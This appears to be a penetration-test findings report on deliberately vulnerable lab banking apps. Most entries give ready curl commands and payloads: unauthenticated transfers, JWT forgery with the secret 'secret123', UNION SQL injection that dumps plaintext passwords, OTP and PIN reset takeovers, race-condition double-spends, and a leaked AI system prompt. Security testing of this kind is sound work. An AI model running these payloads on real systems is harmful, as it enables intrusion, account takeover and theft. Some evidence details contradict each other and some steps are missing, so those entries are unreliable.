title: Unauthenticated IDOR on GET /user/profile/:userID exposes every user's full profile
description: GET /user/profile/:userID requires no authentication and resolves sequential integer IDs. Any anonymous caller obtains username, first/last name, password, USD/EUR account numbers, account UUIDs, balances and phone number for every user, including the admin (userID 1). Nonexistent IDs answer 404 'User not found', which also allows user enumeration.
steps:
1. curl http://paygoat-api:3000/user/profile/1
2. curl http://paygoat-api:3000/user/profile/2
3. HTTP 200 returns full profile JSON incl. password and account UUIDs for each sequential ID.
evidence: HTTP 200 body: {"userID":1,"username":"superhacker",...,"password":"s3cureP@ssw0rd","accountUSD":"USD48354259",...}. Raw outputs: artifacts/missing_auth.txt, artifacts/enumerate_users.txt

title: User passwords stored and returned in plaintext
description: Profiles expose the login password in cleartext (GET /user/profile/:id); login compares the raw value, so passwords are stored unhashed. Combined with the unauthenticated profile endpoint this leaks every credential and enables direct account takeover.
steps:
1. Register: curl -X POST http://paygoat-api:3000/auth/register -H 'Content-Type: application/json' -d '{"username":"alice_pt","firstname":"Alice","lastname":"T","password":"Str0ng!PassA"}'
2. curl http://paygoat-api:3000/user/profile/2
3. Response contains "password":"Str0ng!PassA" verbatim; login with it succeeds.
evidence: artifacts/enumerate_users.txt (admin password s3cureP@ssw0rd) and artifacts/missing_auth.txt (alice_pt password echoed).

title: JWT signature is never verified - forged tokens grant any identity (incl. admin)
description: Bearer tokens are HS256 JWTs, but the backend accepts any token whose header/payload merely base64-decodes: alg:none, tampered payloads and completely garbage signatures all pass authentication (only exp is checked). An attacker forges {"userID":1} to become superhacker, or any other userID, for every auth-gated endpoint, and can delete any account via a forged token.
steps:
1. curl http://paygoat-api:3000/bank/loan/user?userID=1 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOjEsInVzZXJuYW1lIjoieCIsImlhdCI6MTc5MTkwNDgyOCwiZXhwIjoxOTkxOTA0ODI4fQ.NOTAREALSIGNATUREATALL' -> 200
2. alg=none variant also 200 and permitted POST http://paygoat-api:3000/payment/transferthirdparties transferring from the admin account -> 'Transfer successful'
3. Forged token with userID=5 permitted DELETE http://paygoat-api:3000/user/detele-account -> 'Account deleted successfully' (test user removed).
evidence: Garbage-signature and alg=none tokens accepted across endpoints; forged userID=5 token deleted that test account (200) at 15:29.

title: BOLA: PUT /user/profile/:userID lets any user overwrite another user's profile
description: The profile-update endpoint trusts the userID path parameter without comparing it to the caller's token, so user A can rewrite user B's fields. The update also accepts a phoneNumber field: overwriting a victim's phoneNumber hands them the attacker's number, after which /otp/send + /user/reset-password work against the victim; so the same BOLA enables full takeover even without the OTP leak.
steps:
1. As alice (userID 2): curl -X PUT http://paygoat-api:3000/user/profile/3 -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"firstname":"Pwned","lastname":"ByAlice"}'
2. 200 'Profile updated successfully'; GET http://paygoat-api:3000/user/profile/3 shows bob_pt with firstname=Pwned.
evidence: alice token edited userID 3 -> {"message":"Profile updated successfully"}; profile 3 then shows "firstname":"Pwned". Additionally carol's token set user 3's phoneNumber to +544198261971 via PUT /user/profile/3 (readback confirmed 15:44).

title: BOLA: PUT /user/profile/:userID/password lets any user set any other user's password (account takeover)
description: The password-change endpoint does not verify that the path userID belongs to the token holder, so any authenticated user can set a new password for any account and log in as them.
steps:
1. As alice: curl -X PUT http://paygoat-api:3000/user/profile/3/password -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"password":"Owner1!aaa"}' -> 200 'Password updated successfully'
2. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"bob_pt","password":"Owner1!aaa"}' -> 200 'Login successful'
3. Old password now returns 401.
evidence: bob_pt takeover via alice token confirmed end-to-end via login results at 15:27.

title: Missing authentication on POST /bank/account exposes any user's account numbers and balances
description: The accounts endpoint takes userID in the body and requires no token, returning USD/EUR account numbers and live balances for any user.
steps:
1. curl -X POST http://paygoat-api:3000/bank/account -H 'Content-Type: application/json' -d '{"userID":2}'
2. HTTP 200 with accountUSD/balanceUSD/accountEUR/balanceEUR for userID 2, no Authorization header sent.
evidence: artifacts/missing_auth.txt: {"message":"Account data retrieved successfully","data":{"accountUSD":"USD81474975","balanceUSD":100,...}} [200] without token.

title: IDOR on GET /bank/transactions/history: any account number readable by any authenticated user
description: The history endpoint filters solely on the caller-supplied `account` query parameter with no ownership check, so user A can pull the complete transaction ledger of user B (or the admin) by changing the account number.
steps:
1. As alice: curl 'http://paygoat-api:3000/bank/transactions/history?account=USD48354259' -H 'Authorization: Bearer <alice_jwt>'
2. 200 returns the admin's transactions incl. senderID/recipientID, amounts, timestamps and both USD/EUR account numbers of counterparties.
evidence: alice token read admin history (transactionID 5/6 with senderID 1) at 15:26.

title: SQL injection in GET /bank/transactions/history `account` parameter
description: The account value is concatenated directly into the SQL WHERE clause (inserted at two places: senderAccount and accountEUR comparisons). A tautology returns every user's transactions and error responses leak SQLite syntax and query fragments.
evidence: OR-1=1 dumped full cross-user ledger; SQLITE_ERROR strings captured 15:26 (artifacts inline outputs).

title: BOLA on POST /bank/get-credit-card: static client-side AES key lets any user pull any other user's full credit card + CVV
description: Request 'encryption' is AES-CBC of the userID with a key/IV hardcoded in the public JS bundle (key 0123456789abcabcdefdef0123456789, iv abc9876543210def). Any authenticated user can encrypt an arbitrary userID (e.g. 1 = admin) and receive that user's card data back, encrypted with the same public key.
evidence: admin card decrypted from artifacts/card_admin.json; key material from http://paygoat:8000/static/js/bundle.js (CreditCard component).

title: IDOR on GET /bank/loan/user?userID=: read any user's loan records
description: Loans are looked up by the raw userID query parameter with no ownership check, so any caller with any (even forged) token can enumerate other users' loan history.
steps:
1. curl 'http://paygoat-api:3000/bank/loan/user?userID=2' -H 'Authorization: Bearer <bob_or_forged_jwt>' -> 200 {"loans":[... alice's loans ...]}
2. Works equally with garbage-signature tokens.
evidence: alice's loans (loanID 1/2) returned to any token via userID=2 (15:26-15:29 rounds).

title: BOLA on POST /bank/loan/request: userID in body lets attacker create loans on other users' accounts
description: The loan request uses the body's userID, not the token's, for the entire workflow, allowing any user to open auto-approved loans against someone else's account and modify their ledger and balance.
steps:
1. As alice: curl -X POST http://paygoat-api:3000/bank/loan/request -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"userID":3,"amount":100}'
2. 200 'Loan approved and deposited','nuevoSaldo':101 - loan created and credited on bob's account using alice's session.
evidence: nuevoSaldo 101 for userID 3 while authenticated as userID 2 (15:27).

title: BOLA on GET /payment/saved-recipients?userID=: read any user's recipient list
description: Saved recipients are fetched by the userID query parameter without authorization, exposing other users' payment aliases and account UUIDs.
steps:
1. bob registers alias 'bobsavings' -> uuid befda7c8-...
2. As alice: curl 'http://paygoat-api:3000/payment/saved-recipients?userID=3' -H 'Authorization: Bearer <alice_jwt>' -> 200 [{"alias":"bobsavings","uuid":"befda7c8-3840-4d59-bb40-020801600814"}]
evidence: alice read bob's recipients (15:26).

title: BOLA/write on POST /payment/register-alias: aliases can be attached to another user's recipient list
description: register-alias trusts the body userID, so an attacker can inject arbitrary alias->account entries into a victim's saved recipients (recipient poisoning: the victim may later pay an attacker-chosen account via a friendly alias).
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/register-alias -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"alias":"evil","accountNumber":"USD81474975","userID":3}' -> 201
2. GET 'http://paygoat-api:3000/payment/saved-recipients?userID=3' now lists 'evil' inside bob's recipients.
evidence: 'evil' alias written into userID 3's list, confirmed by readback (15:26).

title: Missing authentication on POST /payment/transfer: anonymous users can move money between any accounts
description: The internal transfer endpoint performs no authentication (no token needed) and no ownership check on senderAccountNumber. Anonymous attackers moved funds out of arbitrary accounts, including the admin's.
steps:
1. curl -X POST http://paygoat-api:3000/payment/transfer -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD81474975","recipientAccountNumber":"USD03549387","amount":5,"currencyFrom":"USD","currencyTo":"USD","rate":1}' (NO Authorization header) -> 200 'Transfer successful'; alice 100->95, bob 100->105
2. Same, 2 units from USD48354259 (admin, no token) -> 'Transfer successful'; admin 100->98.
evidence: Balance deltas verified via unauthenticated GET /user/profile after each transfer (15:22-15:24).

title: Missing sender-ownership check on POST /payment/transfer even when authenticated
description: When a token IS provided, the endpoint still uses only the body's senderAccountNumber, so any user can debit accounts they do not own (admin's account debited using alice's token).
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/transfer -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD48354259","recipientAccountNumber":"USD03549387","amount":2,"currencyFrom":"USD","currencyTo":"USD","rate":1}'
2. 200 'Transfer successful'; admin balance decreased.
evidence: admin balance dropped 100->98 after transfer initiated with alice's token (15:24).

title: Insufficient amount validation on POST /payment/transfer (negative and non-numeric amounts accepted)
description: amount is not validated numerically: -50 inverted the flow of money (recipient was debited, sender credited) and the string 'abc' was accepted, string-concatenating into the balance column and corrupting balances to '45abc' and NULL.
steps:
1. curl -X POST http://paygoat-api:3000/payment/transfer -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD03549387","recipientAccountNumber":"USD81474975","amount":-50,"currencyFrom":"USD","currencyTo":"USD","rate":1}' -> 200 'Transfer successful'
2. Same request with "amount":"abc" -> 200; readback: userID2 balance '45abc', userID3 balance null.
evidence: Balance readbacks at 15:24: 2 -> '45abc', 3 -> None (artifacts).

title: Race condition (TOCTOU) on POST /payment/transfer allows double-spending
description: The balance check and the debit are not atomic: three concurrent 300-unit transfers from a balance of 348 produced two 'Transfer successful' responses and two recorded transactions (transactionID 7 and 8, same timestamp) for funds that existed once.
steps:
1. Set alice balance to 348 (loans).
2. Fire 3 parallel requests of amount 300 each to bob.
3. Two succeeded (>348 total); history shows tx 7 & 8 both amount 300 at 15:27:12.
evidence: transactions 7/8 both 300 from senderID 2 while balance was 348 (history endpoint readback).

title: BOLA on POST /payment/transferFundsUuid: funds can be sent from accounts the caller does not own
description: The UUID transfer debits whatever account number is placed in `accountUSD`; there is no check that the account belongs to the token's user. Alice moved money from the admin's USD48354259 using her own token.
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/transferFundsUuid -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"accountUSD":"USD48354259","recipientUUID":"befda7c8-3840-4d59-bb40-020801600814","amount":1}'
2. 200 'USD transfer completed','fromAccount':'USD48354259','from':'0c98cf5f-... (admin uuid)'.
evidence: Response echoes from=admin account while authenticated as alice (15:24).

title: Race condition on POST /payment/transferFundsUuid drains funds into negative balance
description: Three concurrent transfers of 45 against a balance of 48 ALL returned 'USD transfer completed' - the balance check is not atomic, leaving the sender at -87 (sequential overspend afterwards is correctly rejected, proving TOCTOU).
steps:
1. As alice (balance 48): run 3 parallel curl -X POST http://paygoat-api:3000/payment/transferFundsUuid -d '{"accountUSD":"USD81474975","recipientUUID":"<bob uuid>","amount":45}'
2. 3x success. Readback: alice -87, bob +135 beyond what alice had.
evidence: 15:28 round: alice balance -87 after race; later single overspend got 'Insufficient balance' (400).

title: Missing sender-ownership check on POST /payment/transferthirdparties (authenticated)
description: External transfers accept any senderAccountNumber in the body; the token is required but never matched to the sender. Alice's token moved 4 USD from the admin's account.
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/transferthirdparties -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD48354259","recipientAccountNumber":"USD81474975","amount":4}'
2. 200 'Transfer successful'; admin balance decreased by 4 (transactionID 5 in history: senderID 1, recipientID 2).
evidence: history tx 5 shows sender=admin initiated under alice's token (15:24).

title: OTP for password reset is returned in the HTTP response body of POST /otp/send
description: The 'sent' 4-digit one-time code is echoed back to the caller. Anyone can reset any user's password: read the victim's phone number from the unauthenticated profile endpoint, request an OTP, take it from the response, and set a new password.
steps:
1. curl http://paygoat-api:3000/user/profile/4 -> phoneNumber +544805459620
2. curl -X POST http://paygoat-api:3000/otp/send -d '{"phoneNumber":"+544805459620"}' -> 200 {"message":"OTP generated successfully","otp":"3326"}
3. curl -X POST http://paygoat-api:3000/user/reset-password -d '{"phoneNumber":"+544805459620","otp":"3326","newPassword":"Evil1!aaa"}' -> 200
4. Login as weakpwtst / Evil1!aaa -> 200 'Login successful'.
evidence: Full takeover chain executed against test userID 4. The admin's OTP ('2719') was also received via the same flow but deliberately NOT used to avoid locking out the admin.

title: Reset OTP is not invalidated after use and can be replayed
description: /user/reset-password accepts an already-consumed OTP repeatedly (no single-use enforcement), so an intercepted OTP stays valid indefinitely for changing passwords.
steps:
1. Reset user 4 password with OTP 3326 -> 200
2. Repeat reset immediately with the SAME OTP 3326 and newPassword Evil2!aaa -> 200 'Password updated successfully' (reuse accepted).
evidence: Identical OTP accepted twice (15:27).

title: No rate limiting on POST /user/reset-password OTP guessing (4-digit code brute-forceable)
description: 30 consecutive wrong OTP guesses were processed with no lockout, delay or escalating error; a 4-digit keyspace (~10k) is trivially brute-forced, with no authentication required.
steps:
1. Loop 30x: curl -X POST http://paygoat-api:3000/user/reset-password -d '{"phoneNumber":"<victim>","otp":"1001..1030","newPassword":"x"}'
2. Every attempt returns plain 401 'Invalid OTP'; the flow remains usable afterwards.
evidence: 30 sequential wrong OTPs accepted within seconds (15:27).

title: Username enumeration via distinct login errors
description: /auth/login answers 404 'User not found' for unknown usernames versus 401 'Incorrect password' for existing ones, letting attackers confirm valid account names (e.g. superhacker).
steps:
1. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"nosuchuser","password":"x"}' -> 404 'User not found'
2. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"alice_pt","password":"wrong"}' -> 401 'Incorrect password'
evidence: artifacts/login_tests.txt shows the distinct status codes/messages.

title: Phone-number/user enumeration via POST /otp/send
description: /otp/send returns 404 'User not found' for unregistered numbers and 200 (with the OTP itself) for registered numbers, confirming which phone numbers belong to users.
steps:
1. curl -X POST http://paygoat-api:3000/otp/send -d '{"phoneNumber":"+10000000000"}' -> 404 'User not found'
2. curl -X POST http://paygoat-api:3000/otp/send -d '{"phoneNumber":"+544198261971"}' (admin's, leaked via profile) -> 200 {"otp":"2719"}
evidence: 15:29 round outputs.

title: No rate limiting or lockout on POST /auth/login (credential brute-force possible)
description: 17+ wrong-password attempts in quick succession returned plain 401s with no delay, CAPTCHA or lockout, and the correct password still logged in afterwards. X-Forwarded-For rotation was not even needed since there is no limit at all.
steps:
1. Loop 17x: curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"alice_pt","password":"bad"}}' -> all 401
2. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"alice_pt","password":"Str0ng!PassA"}' -> 200
evidence: 15:29 round: 17x401 then 200.

title: No password policy on registration (single-character password accepted)
description: /auth/register accepts passwords like 'a' with no length/complexity requirements, weakening the whole user base to guessing.
steps: 1. curl -X POST http://paygoat-api:3000/auth/register -d '{"username":"weakpwtst","firstname":"x","lastname":"y","password":"a"}' -> 201 'User registered successfully','userID':4
evidence: 201 response with 1-character password (15:20).

title: Full frontend source code exposed via published JavaScript source map
description: http://paygoat:8000/static/js/bundle.js.map is publicly downloadable and contains the complete original React sources, including the hardcoded AES key/IV for the credit-card feature, all API contracts and server file paths (/usr/src/app). The app is additionally served by webpack-dev-server (eval-built bundle, HMR /ws socket) - a development stack exposed in a running application.
steps:
1. curl http://paygoat:8000/static/js/bundle.js.map -o map.json -> 200, 2.6 MB
2. Parse sources[] -> recovered src/components/Dashboard/CreditCard.js with secretKey '0123456789abcabcdefdef0123456789' and iv 'abc9876543210def', plus every other component.
evidence: artifacts/bundle.js.map + reconstructed artifacts/src/*.js.

title: Verbose error handling leaks stack traces, absolute paths and DB engine details on API errors
description: Malformed JSON triggers unhandled Express errors that return full stack traces with absolute server paths and dependency versions (/usr/src/app/node_modules/body-parser/lib/types/json.js:91 etc.); SQL errors are echoed as 500s naming SQLite.
steps:
1. curl -X POST http://paygoat-api:3000/auth/login -H 'Content-Type: application/json' -d '{"username":'  (truncated JSON) -> 400 HTML with SyntaxError stack incl. /usr/src/app/node_modules/...
2. SQLi probe on /bank/transactions/history -> 500 {"error":"SQLITE_ERROR: ..."}.
evidence: Stacks captured at 15:25 and 15:28 (see artifacts/login_tests.txt and missing_auth.txt).

title: Registration errors leak SQLite constraint and schema details
description: Duplicate-username registration returns {"error":"User registration failed","details":"SQLITE_CONSTRAINT: UNIQUE constraint failed: users.username"}, revealing DB engine, table and column names in addition to enabling enumeration.
steps:
1. curl -X POST http://paygoat-api:3000/auth/register -d '{"username":"alice_pt","firstname":"x","lastname":"y","password":"Ab1!aaaa"}'
2. 400 with details 'SQLITE_CONSTRAINT: UNIQUE constraint failed: users.username'.
evidence: artifacts/missing_auth.txt.

title: Missing authorization on support conversations: anonymous read of any ticket and anonymous comment injection
description: GET /support/conversation/:id/comments and POST /support/conversation/:id/comment require neither authentication nor ticket ownership. Any anonymous user can read other users' tickets (a private admin ticket was exposed with its content) and post comments into them.
steps:
1. curl http://paygoat-api:3000/support/conversation/1/comments -> 200 with admin ticket 'Secret Ticket' incl. content and comments
2. curl -X POST http://paygoat-api:3000/support/conversation/1/comment -d '{"comment":"x"}' (no token) -> 201 'Comment added'
evidence: Admin conversation #1 read and commented anonymously (15:20, artifacts/missing_auth.txt).

title: Wildcard CORS (Access-Control-Allow-Origin: *) on API and frontend
description: All responses on paygoat-api:3000 send Access-Control-Allow-Origin: * with Authorization/Content-Type allowed for GET,POST,PUT,DELETE, and paygoat:8000 sends ACAO:* with Allow-Methods:* / Allow-Headers:*. Combined with unauthenticated endpoints (profiles with passwords, OTP), any third-party site can fetch sensitive data cross-origin from a victim's browser context.
steps:
1. curl -i -X OPTIONS http://paygoat-api:3000/payment/transfer -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: authorization' -> 204 with Access-Control-Allow-Origin: *, Allow-Methods GET,POST,PUT,DELETE, Allow-Headers Content-Type,Authorization
2. curl -i http://paygoat:8000/ shows Access-Control-Allow-Origin: * / Methods: * / Headers: *
evidence: Preflight + header captures (15:29 round).

title: Missing security headers and Express fingerprint on the web app
description: SPA responses on paygoat:8000 lack Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options and HSTS while exposing X-Powered-By: Express and wildcard CORS - clickjacking and fingerprinting surface.
steps:
1. curl -i http://paygoat:8000/login | grep -iE 'content-security|x-frame|x-content-type|strict-transport' -> (none present)
2. 'X-Powered-By: Express' present on both hosts.
evidence: Header dump from first reconnaissance request and 15:29 comparison.

title: Client-controlled 'rate' on POST /payment/transfer creates money (balances not conserved)
description: The internal transfer computes settlement values from the caller-supplied rate with no bounds or validation. Sending amount=10 with rate=100 (USD->USD) credited the recipient +10 while the sender's own balance grew +90: 100 units were created from nothing (sum of the two accounts went 556 -> 656). Negative rate (-1) is also accepted. The endpoint requires no authentication at all, so any anonymous attacker can inflate arbitrary accounts.
steps:
1. curl -X POST http://paygoat-api:3000/payment/transfer -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD14373367","recipientAccountNumber":"USD03549387","amount":10,"currencyFrom":"USD","currencyTo":"USD","rate":100}' -> 200 'Transfer successful' (no token sent)
2. curl http://paygoat-api:3000/user/profile/7 -> balanceUSD 110 (was 20, +90 while SENDING); profile/3 -> 546 (was 536, +10). System total increased by 100.
3. Same request with rate=-1 also returns 200 'Transfer successful'.
evidence: Balance readbacks via GET /user/profile/7 and /3 at 15:44; sender GAINED money on an outgoing transfer purely due to the rate parameter.

title: Race condition on POST /bank/loan/request bypasses the maximum-loans limit
description: The per-user loan-count check is not atomic. With one existing loan (limit is 2 per user, observed by sequential exhaustion), two concurrent 600-unit requests were BOTH approved, leaving the user with 3 loans and +1,200 minted beyond the enforced cap. Both responses even reported the same nuevoSaldo (1304.6), proving concurrent stale reads.
steps:
1. Carol (userID 7) has exactly 1 loan. Sequential limit observed: users are blocked at 2 loans (alice was blocked with 'maximum number' at 2).
2. Fire 3 parallel: curl -X POST http://paygoat-api:3000/bank/loan/request -H 'Authorization: Bearer <carol_jwt>' -d '{"userID":7,"amount":600}'
3. Two return 'Loan approved and deposited' (loanID 5 AND 6, same second) -> account now has 3 loans (> limit); balance credited 1200.
evidence: loans for userID 7 after race: [loanID 5: 600, loanID 6: 600, loanID 4: 100] (15:41); sequential cap = 2 demonstrated on alice earlier.

title: Race condition (lost update) on POST /payment/transferthirdparties: two transfers succeed but sender is debited once
description: Concurrent external transfers read-then-write the sender balance without locking: two simultaneous 100-unit transfers both returned 'Transfer successful' and both were credited to the recipient (alice -87 -> 113 = +200), while the sender's balance dropped by only 100 (carol 1204.6 -> 1104.6). Money is created out of thin air; the ledger and balances diverge.
steps:
1. Carol balance 1204.6. Fire 2 parallel: curl -X POST http://paygoat-api:3000/payment/transferthirdparties -H 'Authorization: Bearer <carol_jwt>' -d '{"senderAccountNumber":"USD14373367","recipientAccountNumber":"USD81474975","amount":100}'
2. Both -> 200 'Transfer successful'.
3. Readback: carol 1104.6 (only -100), alice 113 (+200 from -87). One debit lost.
evidence: Balance arithmetic recorded at 15:43-15:44 via GET /user/profile/2 and /7.

title: SQL Injection in /login leads to authentication bypass and admin access
description: The /login endpoint concatenates the username into a SQL query without parameterization. A comment payload bypasses the password check entirely, logging the attacker in as the admin user (user_id 1, is_admin true) with no valid password.
evidence: admin' --  returns isAdmin:true token; accountNumber ADMIN001

title: Unauthenticated SQL Injection in /check_balance/{account_number} dumps all credentials
description: The account_number path parameter is concatenated into SELECT username, balance FROM users WHERE account_number='...'. No authentication is required. A UNION injection (column 1 text, column 2 numeric) extracts every user's username and password, which are stored in plaintext.
steps:
1. GET /check_balance/' UNION SELECT username||' | '||password, CAST(balance AS numeric) FROM users--  (URL-encode the quote/spaces)
2. Response 'username' field returns e.g. 'alice_42937 | AlicePass123!'.
3. Admin row: GET /check_balance/' UNION SELECT password, CAST(1 AS numeric) FROM users WHERE is_admin=true-- returns 'admin123'.
evidence: UNION returns 'alice_42937 | AlicePass123!' and admin password 'admin123'

title: SQL Injection in /api/transactions account_number query parameter
description: The account_number query parameter is concatenated into PostgreSQL inside an authenticated endpoint (WHERE from_account='<input>' ...). Full UNION extraction confirmed: a 7-column UNION (text cols 1-3) dumped the entire users table with plaintext passwords using only a normal user's token.
steps:
1. Auth as alice. GET /api/transactions?account_number=' OR '1'='1 -> returns transaction rows (injection changes scope).
2. GET /api/transactions?account_number=x' UNION SELECT 0, username||' | '||account_number, 'pw:'||password, balance, '2026-01-01 00:00:00', '2026-01-01 00:00:00', '2026-01-01 00:00:00' FROM users--  (URL-encode all specials)
3. Response 'transactions' contains 12 rows, e.g. from_account='admin | ADMIN001', to_account='pw:admin123' -> full credential dump via another user's token.
evidence: 12 users with plaintext passwords exfiltrated via UNION; also leaks 'each UNION query must have the same number of columns' errors

title: Weak JWT signing secret allows forging admin and arbitrary-user tokens
description: The HS256 JWT is signed with the guessable secret 'secret123'. The signature cracks against common words. An attacker can craft a token with is_admin:true (or any user_id) and gain admin privileges on all protected endpoints.
steps:
1. Cracked secret: HMAC-SHA256(header.payload, 'secret123') == provided signature for a valid login token.
2. Forge {"user_id":1,"username":"admin","is_admin":true,"iat":...} signed with 'secret123'.
3. GET /sup3r_s3cr3t_admin with forged token -> HTTP 200 admin panel; POST /admin/create_admin -> 'Admin created successfully'. A real non-admin token gets HTTP 403.
evidence: secret 'secret123' reproduces the JWT signature; forged is_admin token unlocks admin endpoints

title: Full account takeover via leaked reset PIN in /api/v1/forgot-password
description: The v1 forgot-password endpoint is unauthenticated and returns the 3-digit reset PIN directly in the JSON response (debug_info.pin). Combined with /api/v1/reset-password this lets an attacker set a new password on any account.
steps:
1. POST /api/v1/forgot-password {"username":"<victim>"} -> response contains debug_info.pin (e.g. '778').
2. POST /api/v1/reset-password {"username":"<victim>","reset_pin":"778","new_password":"EvilPass#99"} -> 'Password has been reset successfully'.
3. POST /login with the new password succeeds and returns the victim's token.
evidence: debug_info.pin returned; reset+login as victim succeeded

title: Brute-forceable 3-digit reset PIN with no rate limiting
description: Reset PINs are only 3 digits (1000 possibilities) and /api/v{1,2}/reset-password has no rate limiting or lockout, so an attacker can brute-force any account's PIN even when v1 does not leak it.
steps:
1. POST /api/v2/forgot-password {"username":"<victim>"} (v2 does not return the PIN).
2. Loop POST /api/v2/reset-password trying reset_pin 000..999 with an attacker new_password.
3. Confirmed: correct PIN found at attempt #867 (~18s, 612..867 requests, no block), then login with the new password succeeded.
evidence: PIN 611 accepted on attempt 612; no lockout observed

title: Race condition in /transfer allows double-spending and negative balances
description: Balance check and debit in /transfer are not atomic and there is no locking, so concurrent transfers all pass the 'sufficient funds' check and each debit is applied, draining a victim account below zero.
steps:
1. Auth as user A (balance 6500), target B's account.
2. Fire 15 concurrent POST /transfer each with amount=6500 to B.
3. 4 transfers returned 'success'; A's balance went to -19500 and B's to +26500 (created money / drained below zero).
evidence: 4 concurrent full-balance transfers all succeeded; balance -19500

title: Negative-amount transfer lets an attacker steal from any account
description: /transfer accepts negative amounts and only checks that the sender's balance is sufficient, so a negative transfer DEBITS the recipient and CREDITS the sender, allowing theft from any account number.
steps:
1. Auth as A. POST /transfer {"to_account":"<B acct>","amount":-500}.
2. Response 'Transfer Completed', new_balance 6500 (A credited).
3. Verified: A balance +500 (6000->6500), B balance -500 (1000->500).
evidence: amount:-500 moved funds from B to A

title: Werkzeug interactive debugger exposed at /console (RCE surface + secret leak)
description: The Flask/Werkzeug interactive debugger is reachable at /console with EVALEX=true and exposes its per-session debugger SECRET in the page source. Debugger resources (debugger.js) load and the console is a known remote-code-execution vector; at minimum it leaks internal state.
steps:
1. GET /console -> 200 'Interactive Console // Werkzeug Debugger' with var SECRET = "g15ifegYZdKh9IWXB6Xx" and EVALEX=true.
2. GET /console?__debugger__=yes&cmd=resource&f=debugger.js -> 200 application/javascript (live debugger dispatch, not a static page).
evidence: /console serves debugger console with secret g15ifegYZdKh9IWXB6Xx; resource cmd returns live debugger.js

title: Missing function-level authorization: admin endpoints reachable via JWT is_admin claim
description: Admin-only endpoints (/admin/create_admin, /admin/approve_loan, /admin/delete_account, /sup3r_s3cr3t_admin) authorize solely on the client-controllable is_admin JWT claim rather than a server-side role lookup, so a forged is_admin token grants full admin functionality including deleting arbitrary accounts.
steps:
1. Forge HS256 token {"user_id":1,"is_admin":true} with secret 'secret123'.
2. POST /admin/delete_account/<victim_id> -> 'Account deleted successfully' (debug_info.deleted_by admin).
3. POST /admin/create_admin -> 'Admin created successfully'. A normal (is_admin:false) token returns 403, confirming the only gate is the forgeable claim.
evidence: forged is_admin token created admin + deleted account 5; real token -> 403

title: Unauthenticated IDOR (BOLA) in /check_balance exposes any account's balance and owner
description: /check_balance/{account_number} requires no authentication and returns the balance and username of any account number, exposing customer financial data to anonymous callers.
steps:
1. GET /check_balance/3829323968 with NO Authorization header.
2. Response: {balance: 1000.0, username: 'bob_42937', account_number: '3829323968'}.
evidence: anon GET returned another user's balance + username

title: Unauthenticated IDOR (BOLA) in /transactions/{account_number} exposes any account's history
description: /transactions/{account_number} needs no authentication and returns the full transaction list (amounts, counterparties, descriptions) for any account number.
steps:
1. GET /transactions/3829323968 with NO Authorization header.
2. Response returns the transaction array for that account (e.g. amount 6500, description 'race', from/to accounts).
evidence: anon GET returned another account's transactions

title: IDOR (BOLA) in /api/transactions lets any user read any other account's transactions
description: With a valid JWT the account_number query parameter is not checked for ownership, so any authenticated user can retrieve another user's transaction history.
steps:
1. Auth as alice. GET /api/transactions?account_number=<bob's acct>.
2. HTTP 200 returns {account_number: <bob>, transactions:[...]} with no ownership check.
evidence: alice token read bob's transactions successfully

title: IDOR (BOLA) in virtual cards: cross-user freeze via /api/virtual-cards/{card_id}/toggle-freeze
description: The card_id path parameter is not bound to the requesting user, so any authenticated user can freeze/unfreeze another user's card. The endpoint returned success acting on a card owned by someone else.
steps:

2. Response {message:'Card frozen successfully', status:'success'} -> bob altered alice's card.
evidence: bob successfully froze alice's card 1

title: IDOR (BOLA) reading any card via /api/virtual-cards/{card_id}/transactions and update-limit
description: card_id is not authorized, so an attacker can read another user's card transactions and attempt to modify another user's card limit, confirming missing object-level checks on the card sub-resources.
steps:
1. Auth as bob. GET /api/virtual-cards/1/transactions (alice's card) -> 200 success (reads alice's card data).
2. Auth as bob. POST /api/virtual-cards/1/update-limit {"limit":999999} -> the request reached alice's card (returned a SQL error, not 'not your card').
evidence: bob read alice's card transactions (200) and reached alice's card for limit update

title: Full card PAN and CVV disclosed by /api/virtual-cards
description: The card listing (and creation) responses return the complete card number and CVV in cleartext, which must never be exposed after issuance.
steps:

2. Response card_details: card_number 9375899232312504, cvv 154, expiry 10/27.
3. GET /api/virtual-cards also returns full card_number + cvv for each card.
evidence: card_number 9375899232312504 and cvv 154 returned in JSON

title: Negative-amount bill payment credits the attacker's account (business logic)
description: /api/bill-payments/create does not validate that amount is positive, so paying a negative amount processes successfully and INCREASES the account balance.

2. Response {message:'Payment processed successfully', payment_details.amount:-500.0}.
evidence: payment of -500 returned success

title: Unauthenticated /api/ai/system-info leaks AI system prompt and full database schema
description: GET /api/ai/system-info requires no authentication and returns the AI agent's system prompt (which instructs it to comply with any request and query the database freely), the exact users/transactions table columns, the LLM provider/URL/model, and internal endpoints.

2. Response includes system_info.system_prompt, database tables users(id,username,password,account_number,balance,is_admin,profile_picture) and transactions(...), api_provider DeepSeek, database_access:true.
evidence: system_prompt + DB schema returned to anonymous caller

title: Unauthenticated AI chat endpoint with designed-in prompt injection and DB access
